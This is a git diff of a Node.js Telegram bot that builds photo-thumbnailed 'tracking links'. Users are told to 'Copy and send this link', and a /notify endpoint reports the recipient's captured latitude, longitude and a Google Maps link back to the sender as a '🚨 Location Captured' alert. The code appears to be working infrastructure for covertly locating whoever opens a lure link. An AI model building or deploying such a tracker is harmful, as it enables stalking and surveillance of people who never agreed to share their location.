@@ -1,22 +1,71 @@
 const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
 const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
 const axios = require('axios');
+const path = require('path');
 require('dotenv').config();
 
-const token = process.env.BOT_TOKEN;
+/* =========================
+   CONFIG
+========================= */
+const BOT_TOKEN = process.env.BOT_TOKEN;
 const BASE_URL = process.env.BASE_URL;
+const BOT_API_PORT = process.env.BOT_API_PORT || 5000;
+const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
 
-const bot = new TelegramBot(token, {
+if (!BOT_TOKEN || !BASE_URL) {
+    console.error('Missing BOT_TOKEN or BASE_URL in .env');
+    process.exit(1);
+}
+
+/* =========================
+   TELEGRAM BOT
+========================= */
+const bot = new TelegramBot(BOT_TOKEN, {
     polling: true
 });
 
-console.log('🤖 Bot running...');
+console.log('🤖 Telegram bot running...');
 
+/* =========================
+   EXPRESS APP
+========================= */
+const app = express();
+app.use(express.json());
+
+/* =========================
+   SESSION STORE
+========================= */
 const userSessions = {};
 
+/* =========================
+   HELPERS
+========================= */
+function getLinks() {
+    if (!fs.existsSync('links.json')) {
+        return [];
+    }
 
-// START
+    return JSON.parse(
+        fs.readFileSync('links.json')
+    );
+}
+
+function saveLink(data) {
+    const links = getLinks();
+
+    links.push(data);
+
+    fs.writeFileSync(
+        'links.json',
+        JSON.stringify(links, null, 2)
+    );
+}
+
+/* =========================
+   START COMMAND
+========================= */
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
 
@@ -30,8 +79,9 @@ bot.onText(/\/start/, (msg) => {
     );
 });
 
-
-// HANDLE TEXT
+/* =========================
+   HANDLE TEXT INPUT
+========================= */
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
 
@@ -47,8 +97,8 @@ bot.on('message', async (msg) => {
         session.name = msg.text;
         session.telegramUsername =
             msg.from.username || 'No username';
-
         session.telegramId = msg.from.id;
+
         session.step = 'awaiting_photo';
 
         bot.sendMessage(
@@ -58,8 +108,9 @@ bot.on('message', async (msg) => {
     }
 });
 
-
-// HANDLE PHOTO
+/* =========================
+   HANDLE PHOTO UPLOAD
+========================= */
 bot.on('photo', async (msg) => {
     const chatId = msg.chat.id;
 
@@ -69,72 +120,201 @@ bot.on('photo', async (msg) => {
 
     if (session.step !== 'awaiting_photo') return;
 
-    const photo =
-        msg.photo[msg.photo.length - 1];
+    try {
+        const photo =
+            msg.photo[msg.photo.length - 1];
 
-    const fileId = photo.file_id;
+        const fileId = photo.file_id;
 
-    // Get Telegram file URL
-    const file = await bot.getFile(fileId);
+        // Get Telegram file path
+        const file =
+            await bot.getFile(fileId);
 
-    const fileUrl =
-        `https://api.telegram.org/file/bot${token}/${file.file_path}`;
+        const fileUrl =
+            `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
 
-    const localName =
-        `uploads/${uuidv4()}.jpg`;
+        // Save image locally
+        const filename =
+            `${uuidv4()}.jpg`;
 
-    // Download image
-    const response = await axios({
-        url: fileUrl,
-        method: 'GET',
-        responseType: 'stream'
-    });
+        const localPath =
+            path.join(
+                __dirname,
+                'uploads',
+                filename
+            );
 
-    response.data.pipe(
-        fs.createWriteStream(localName)
-    );
+        const response =
+            await axios({
+                url: fileUrl,
+                method: 'GET',
+                responseType: 'stream'
+            });
 
-    // Create tracking link
-    const linkId = uuidv4();
+        const writer =
+            fs.createWriteStream(localPath);
 
-    const trackingLink =
-        `${BASE_URL}/t/${linkId}`;
+        response.data.pipe(writer);
 
-    // Save
-    saveLink({
-        linkId,
-        ownerName: session.name,
-        telegramUsername:
-            session.telegramUsername,
-        ownerChatId: chatId,
-        thumbnail: `/${localName}`,
-        createdAt:
-            new Date().toISOString()
-    });
+        await new Promise(
+            (resolve, reject) => {
+                writer.on(
+                    'finish',
+                    resolve
+                );
+                writer.on(
+                    'error',
+                    reject
+                );
+            }
+        );
 
-    bot.sendMessage(
-        chatId,
-        `✅ Link created.\n\n${trackingLink}`
-    );
+        // Generate link
+        const linkId = uuidv4();
 
-    delete userSessions[chatId];
-});
+        const trackingLink =
+            `${BASE_URL}/t/${linkId}`;
 
+        // Save metadata
+        saveLink({
+            linkId,
+            ownerName:
+                session.name,
+            telegramUsername:
+                session.telegramUsername,
+            ownerChatId:
+                chatId,
+            thumbnail:
+                `/uploads/${filename}`,
+            createdAt:
+                new Date().toISOString()
+        });
 
-// SAVE
-function saveLink(data) {
-    let links = [];
+        bot.sendMessage(
+            chatId,
+            `✅ Link created successfully.\n\n${trackingLink}\n\nCopy and send this link.`
+        );
 
-    if (fs.existsSync('links.json')) {
-        links = JSON.parse(
-            fs.readFileSync('links.json')
+        delete userSessions[chatId];
+
+    } catch (err) {
+        console.error(err);
+
+        bot.sendMessage(
+            chatId,
+            'Error processing image. Please try again.'
         );
     }
+});
 
-    links.push(data);
+/* =========================
+   LOCATION NOTIFICATION API
+   Called by Vercel server
+========================= */
+app.post('/notify', async (req, res) => {
+    try {
+        const apiKey =
+            req.headers['x-api-key'];
 
-    fs.writeFileSync(
-        'links.json',
-        JSON.stringify(links, null, 2)
-    );
-}
+        if (
+            apiKey !==
+            NOTIFY_API_KEY
+        ) {
+            return res
+                .status(401)
+                .json({
+                    error:
+                        'Unauthorized'
+                });
+        }
+
+        const {
+            ownerChatId,
+            ownerName,
+            latitude,
+            longitude
+        } = req.body;
+
+        const mapLink =
+            `https://maps.google.com/?q=${latitude},${longitude}`;
+
+        console.log(
+            '========================'
+        );
+        console.log(
+            '📍 LOCATION ALERT'
+        );
+        console.log(
+            'Owner:',
+            ownerName
+        );
+        console.log(
+            'Latitude:',
+            latitude
+        );
+        console.log(
+            'Longitude:',
+            longitude
+        );
+        console.log(
+            'Map:',
+            mapLink
+        );
+        console.log(
+            '========================'
+        );
+
+        const message = `
+🚨 Location Captured
+
+Owner: ${ownerName}
+
+Latitude: ${latitude}
+Longitude: ${longitude}
+
+Map:
+${mapLink}
+`;
+
+        await bot.sendMessage(
+            ownerChatId,
+            message
+        );
+
+        res.json({
+            success: true
+        });
+
+    } catch (err) {
+        console.error(err);
+
+        res.status(500).json({
+            error: err.message
+        });
+    }
+});
+
+/* =========================
+   START EXPRESS SERVER
+========================= */
+app.listen(
+    BOT_API_PORT,
+    () => {
+        console.log(
+            `🌐 Notify API running on port ${BOT_API_PORT}`
+        );
+    }
+);
+
+/* =========================
+   POLLING ERROR
+========================= */
+bot.on(
+    'polling_error',
+    (error) => {
+        console.log(
+            'Polling Error:',
+            error.message
+        );
+    }
+);
